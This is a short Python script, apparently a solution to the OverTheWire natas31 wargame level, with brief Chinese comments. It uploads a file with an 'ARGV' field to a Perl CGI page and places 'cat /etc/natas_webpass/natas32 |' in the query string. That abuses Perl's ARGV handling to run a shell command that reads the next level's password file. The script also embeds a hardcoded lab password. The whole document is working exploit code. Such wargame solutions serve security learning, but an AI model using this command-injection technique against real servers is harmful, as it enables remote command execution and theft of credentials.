import requests
from requests.auth import HTTPBasicAuth
url = 'http://natas31.natas.labs.overthewire.org/index.pl?cat%20/etc/natas_webpass/natas32%20|'#問號後也可以單純/etc/natas_webpass/natas32%20
ps31 = 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y'
user = 'natas31'
basicAuth=HTTPBasicAuth(user,ps31)
files = {
    'file': ('natas31.csv', open('natas31.csv', 'rb'))
}
data ={
    'file': 'ARGV'#傳入命令行這樣就會將傳入參數視為指令
}
response = requests.post(url, auth=basicAuth, files=files,data=data)
print(response.text)
